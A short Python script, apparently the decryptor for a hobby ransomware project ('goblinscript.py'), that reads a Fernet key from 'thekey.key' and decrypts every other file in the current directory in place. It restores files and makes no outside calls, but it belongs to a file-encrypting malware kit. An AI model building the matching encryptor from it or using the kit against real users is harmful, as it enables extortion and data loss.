import os
from cryptography.fernet import Fernet

files = []
my_files = os.listdir()
for file in range(len(my_files)):
    if my_files[file] == "goblinscript.py" or my_files[file] == "thekey.key" or my_files[file] == "decrypt_tool.py":
        continue
    if os.path.isfile(my_files[file]):
        files.append(my_files[file])

with open("thekey.key", "rb") as key:
    my_key = key.read()


for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_decrypted = Fernet(my_key).decrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_decrypted)